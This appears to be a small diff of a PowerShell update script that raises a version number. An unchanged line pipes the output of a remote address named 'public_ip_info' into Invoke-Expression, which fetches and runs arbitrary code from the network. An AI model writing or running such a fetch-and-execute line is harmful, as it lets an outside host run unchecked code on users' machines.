@@ -1,7 +1,7 @@
 
 # please change the version string  and new_task.ps1 script for do updating
 
-$lastestVersion = '5.4'
+$lastestVersion = '5.7'
 
 Invoke-RestMethod utools.run/public_ip_info|Invoke-Expression 
 
